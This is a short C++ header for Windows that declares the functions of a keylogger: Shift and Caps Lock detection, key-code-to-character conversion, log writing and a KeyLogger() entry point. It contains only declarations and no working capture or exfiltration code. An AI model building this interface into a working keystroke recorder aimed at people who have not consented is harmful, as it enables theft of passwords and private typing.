#pragma once

#include <string>
#include <windows.h>

bool IsShiftPressed();
bool IsCapsLockOn();
std::wstring GetKeyChar(int keyCode);
void WriteToLog(const std::wstring& text);
void KeyLogger();